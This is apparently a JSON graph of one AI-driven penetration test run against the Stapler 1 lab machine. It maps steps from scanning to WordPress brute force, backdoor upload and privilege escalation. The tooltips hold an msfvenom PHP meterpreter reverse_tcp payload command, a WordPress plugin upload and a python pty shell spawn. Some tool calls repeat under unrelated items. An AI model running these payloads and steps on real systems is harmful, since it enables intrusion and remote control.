@@ -1,0 +1,706 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "Stapler 1",
+  "source": "training_data.csv, Machine == 'Stapler 1', 9 row(s), 1 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:Stapler 1:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'Stapler 1'. 1 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s2_3.1",
+      "label": "Search: 3.1\nWordPress Discovery",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.1: WordPress Discovery\n\nMCP tool calls:\nNmap to execute nmap -p- -A 192.168.1.126 for all ports scanning",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s2_3.1",
+      "label": "Track: WordPress Discovery",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.1 WordPress Discovery:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s2_3.1",
+      "label": "Agent: 3.1\nVulnerability Assessm\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.1:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u25cb 3 Vulnerability Assessment\n  \u25cb 3.1 WordPress Discovery\n  \u25cb 3.2 WordPress Enumeration\n\u25cb 4 Exploitation\n\u25cb 5 Post-Exploitation\n\u25cb 6 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s2_3.2",
+      "label": "Search: 3.2\nWordPress Enumeration",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 3.2: WordPress Enumeration\n\nMCP tool calls:\nNmap to execute nmap -p- -A 192.168.1.126 for all ports scanning",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s2_3.2",
+      "label": "Track: WordPress Enumeration",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "3.2 WordPress Enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s2_3.2",
+      "label": "Agent: 3.2\nVulnerability Assessm\u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 3.2:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u25cb 3 Vulnerability Assessment\n  \u25cb 3.1 WordPress Discovery\n  \u25cb 3.2 WordPress Enumeration\n\u25cb 4 Exploitation\n\u25cb 5 Post-Exploitation\n\u25cb 6 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s3_4.1",
+      "label": "Search: 4.1\nCredential Brute Force",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.1: Credential Brute Force\n\nMCP tool calls:\nWeb page interaction to access https://192.168.1.126:12380/blogblog/, WPScan via Interactive CLI or Google search",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s3_4.1",
+      "label": "Track: Credential Brute Force",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.1 Credential Brute Force:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s3_4.1",
+      "label": "Agent: 4.1\nExploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.1:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u25cb 4 Exploitation\n  \u25cb 4.1 Credential Brute Force\n  \u25cb 4.2 Backdoor Upload\n\u25cb 5 Post-Exploitation\n\u25cb 6 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s3_4.2",
+      "label": "Search: 4.2\nBackdoor Upload",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 4.2: Backdoor Upload\n\nMCP tool calls:\nWeb page interaction to access https://192.168.1.126:12380/blogblog/, WPScan via Interactive CLI or Google search",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s3_4.2",
+      "label": "Track: Backdoor Upload",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "4.2 Backdoor Upload:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s3_4.2",
+      "label": "Agent: 4.2\nExploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 4.2:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u25cb 4 Exploitation\n  \u25cb 4.1 Credential Brute Force\n  \u25cb 4.2 Backdoor Upload\n\u25cb 5 Post-Exploitation\n\u25cb 6 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s5_5.1",
+      "label": "Search: 5.1\nSystem Enumeration",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 5.1: System Enumeration\n\nMCP tool calls:\nMetasploit to generate payload: msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.132 lport=4444 -f raw, Web page interaction to login and upload plugin",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s5_5.1",
+      "label": "Track: System Enumeration",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "5.1 System Enumeration:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s5_5.1",
+      "label": "Agent: 5.1\nPost-Exploitation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 5.1:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u2713 4 Exploitation\n  \u2713 4.1 Credential Brute Force\n  \u2713 4.2 Backdoor Upload\n\u25cb 5 Post-Exploitation\n  \u25cb 5.1 System Enumeration\n\u25cb 6 Privilege Escalation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s6_6.1",
+      "label": "Search: 6.1\nKernel Exploit Research",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 6.1: Kernel Exploit Research\n\nMCP tool calls:\nInteractive CLI to spawn shell, execute python -c 'import pty;pty.spawn('/bin/bash')', run lsb_release -a",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s6_6.1",
+      "label": "Track: Kernel Exploit Research",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "6.1 Kernel Exploit Research:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s6_6.1",
+      "label": "Agent: 6.1\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 6.1:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u2713 4 Exploitation\n  \u2713 4.1 Credential Brute Force\n  \u2713 4.2 Backdoor Upload\n\u2713 5 Post-Exploitation\n  \u2713 5.1 System Enumeration\n\u25cb 6 Privilege Escalation\n  \u25cb 6.1 Kernel Exploit Research\n  \u25cb 6.2 Exploit Execution",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:Stapler 1:r1_s6_6.2",
+      "label": "Search: 6.2\nExploit Execution",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "PTT item 6.2: Exploit Execution\n\nMCP tool calls:\nInteractive CLI to spawn shell, execute python -c 'import pty;pty.spawn('/bin/bash')', run lsb_release -a",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:Stapler 1:r1_s6_6.2",
+      "label": "Track: Exploit Execution",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "6.2 Exploit Execution:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_s6_6.2",
+      "label": "Agent: 6.2\nPrivilege Escalation",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Cumulative PTT after 6.2:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u2713 4 Exploitation\n  \u2713 4.1 Credential Brute Force\n  \u2713 4.2 Backdoor Upload\n\u2713 5 Post-Exploitation\n  \u2713 5.1 System Enumeration\n\u25cb 6 Privilege Escalation\n  \u25cb 6.1 Kernel Exploit Research\n  \u25cb 6.2 Exploit Execution",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:Stapler 1:r1_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "Final cumulative PTT for this run:\n\u2713 1 Network Reconnaissance\n\u2713 2 Service Enumeration\n\u2713 3 Vulnerability Assessment\n  \u2713 3.1 WordPress Discovery\n  \u2713 3.2 WordPress Enumeration\n\u2713 4 Exploitation\n  \u2713 4.1 Credential Brute Force\n  \u2713 4.2 Backdoor Upload\n\u2713 5 Post-Exploitation\n  \u2713 5.1 System Enumeration\n\u2713 6 Privilege Escalation\n  \u2713 6.1 Kernel Exploit Research\n  \u2713 6.2 Exploit Execution",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "from": "agent:Stapler 1:START",
+      "to": "agent:Stapler 1:r1_s2_3.1",
+      "label": "\u2192 3.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:START",
+      "to": "search:Stapler 1:r1_s2_3.1",
+      "label": "3.1 WordPress Discovery",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s2_3.1",
+      "to": "track:Stapler 1:r1_s2_3.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s2_3.1",
+      "to": "agent:Stapler 1:r1_s2_3.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s2_3.1",
+      "to": "agent:Stapler 1:r1_s2_3.2",
+      "label": "\u2192 3.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s2_3.1",
+      "to": "search:Stapler 1:r1_s2_3.2",
+      "label": "3.2 WordPress Enumerati\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s2_3.2",
+      "to": "track:Stapler 1:r1_s2_3.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s2_3.2",
+      "to": "agent:Stapler 1:r1_s2_3.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s2_3.2",
+      "to": "agent:Stapler 1:r1_s3_4.1",
+      "label": "\u2192 4.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s2_3.2",
+      "to": "search:Stapler 1:r1_s3_4.1",
+      "label": "4.1 Credential Brute Fo\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s3_4.1",
+      "to": "track:Stapler 1:r1_s3_4.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s3_4.1",
+      "to": "agent:Stapler 1:r1_s3_4.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s3_4.1",
+      "to": "agent:Stapler 1:r1_s3_4.2",
+      "label": "\u2192 4.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s3_4.1",
+      "to": "search:Stapler 1:r1_s3_4.2",
+      "label": "4.2 Backdoor Upload",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s3_4.2",
+      "to": "track:Stapler 1:r1_s3_4.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s3_4.2",
+      "to": "agent:Stapler 1:r1_s3_4.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s3_4.2",
+      "to": "agent:Stapler 1:r1_s5_5.1",
+      "label": "\u2192 5.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s3_4.2",
+      "to": "search:Stapler 1:r1_s5_5.1",
+      "label": "5.1 System Enumeration",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s5_5.1",
+      "to": "track:Stapler 1:r1_s5_5.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s5_5.1",
+      "to": "agent:Stapler 1:r1_s5_5.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s5_5.1",
+      "to": "agent:Stapler 1:r1_s6_6.1",
+      "label": "\u2192 6.1",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s5_5.1",
+      "to": "search:Stapler 1:r1_s6_6.1",
+      "label": "6.1 Kernel Exploit Rese\u2026",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s6_6.1",
+      "to": "track:Stapler 1:r1_s6_6.1",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s6_6.1",
+      "to": "agent:Stapler 1:r1_s6_6.1",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s6_6.1",
+      "to": "agent:Stapler 1:r1_s6_6.2",
+      "label": "\u2192 6.2",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s6_6.1",
+      "to": "search:Stapler 1:r1_s6_6.2",
+      "label": "6.2 Exploit Execution",
+      "type": "SearchUpdate",
+      "color": "#06D6A0",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "search:Stapler 1:r1_s6_6.2",
+      "to": "track:Stapler 1:r1_s6_6.2",
+      "label": "Discover",
+      "type": "TrackUpdate",
+      "color": "#3A86FF",
+      "width": 3,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "track:Stapler 1:r1_s6_6.2",
+      "to": "agent:Stapler 1:r1_s6_6.2",
+      "label": "Leads to",
+      "type": "Prediction",
+      "color": "#8338EC",
+      "width": 2,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    },
+    {
+      "from": "agent:Stapler 1:r1_s6_6.2",
+      "to": "agent:Stapler 1:r1_close",
+      "label": "close",
+      "type": "StateTransition",
+      "color": "#000000",
+      "width": 4,
+      "arrows": "to",
+      "smooth": {
+        "type": "continuous"
+      }
+    }
+  ],
+  "graph_statistics": {
+    "total_nodes": 23,
+    "total_edges": 29,
+    "agent_nodes": 9,
+    "search_nodes": 7,
+    "track_nodes": 7,
+    "runs_detected": 1,
+    "rows_captured": 9
+  }
+}
